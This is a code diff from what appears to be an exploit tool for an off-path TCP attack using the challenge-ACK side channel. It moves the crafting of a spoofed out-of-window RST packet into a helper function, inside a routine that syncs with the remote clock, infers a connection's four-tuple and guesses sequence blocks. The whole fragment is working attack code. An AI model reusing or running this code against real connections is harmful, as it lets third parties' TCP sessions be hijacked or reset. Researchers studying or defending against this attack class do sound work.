@@ -354,6 +354,47 @@ void *recv_thread(void *arg)
 
 
 /*
+ * prepare the RST packet we'll use to elicit challenge ACKs on our legit
+ * connection.
+ */
+int prepare_rst_packet(packet_t *ppkt)
+{
+	uint32_t old_seq;
+	volatile conn_t *legit = &(g_ctx.conn_legit);
+
+	/* save the old sequence number */
+	old_seq = legit->seq;
+
+	/* advance it by some amount so that it is out of window */
+	legit->seq += 5000;
+
+	/* allocate a buffer for the packet */
+	ppkt->len = 8192;
+	ppkt->buf = malloc(ppkt->len);
+	if (!ppkt->buf) {
+		fprintf(stderr, "[!] no memory for RST packet!\n");
+		return 0;
+	}
+
+	/* add the phys header */
+	memcpy(ppkt->buf, ROUTER_MAC LOCAL_MAC "\x08\x00", g_ctx.ipoff);
+
+	/* craft the packet! */
+	if (!tcp_craft(ppkt->buf + g_ctx.ipoff, &(ppkt->len), legit, TH_RST, "x", 1))
+		return 0;
+
+	/* adjust the length to include the phys part */
+	ppkt->len += g_ctx.ipoff;
+
+	/* set the sequence number back to the original value..
+	 * this way the connection remains ok.
+	 */
+	legit->seq = old_seq;
+	return 1;
+}
+
+
+/*
  * conduct the attack:
  * 1. synchronize with remote clock
  * 2. infer four-tuple
@@ -367,29 +408,20 @@ int conduct_offpath_attack(void)
 {
 	int chack_cnt[4] = { 0 };
 	int i, round = 0;
-	uint32_t old_seq;
 	packet_t rst_pkt;
 	pthread_t sth, rth;
 	struct timeval start, now, diff;
 	astate_t attack_state = AS_SYNC;
-	volatile conn_t *legit, *spoof;
+	volatile conn_t *spoof;
 	uint16_t guess_start = 0, guess_end = 0, guess_mid = 0;
 	uint32_t seq_nblocks = UINT32_MAX / g_ctx.winsz;
 	uint32_t seq_block = 0, seq_last_block = 0;
 
-	legit = &(g_ctx.conn_legit);
 	spoof = &(g_ctx.conn_spoof);
 
 	/* generate the packet we'll send over and over to elicit challenge ACKs */
-	old_seq = legit->seq;
-	legit->seq += 5000;
-	rst_pkt.len = 8192;
-	rst_pkt.buf = malloc(rst_pkt.len);
-	memcpy(rst_pkt.buf, ROUTER_MAC LOCAL_MAC "\x08\x00", g_ctx.ipoff);
-	if (!tcp_craft(rst_pkt.buf + g_ctx.ipoff, &rst_pkt.len, legit, TH_RST, "x", 1))
+	if (!prepare_rst_packet(&rst_pkt))
 		return 0;
-	rst_pkt.len += g_ctx.ipoff;
-	legit->seq = old_seq;
 
 	/* spawn the recv thread first
 	 * it will live throughout the attack process...
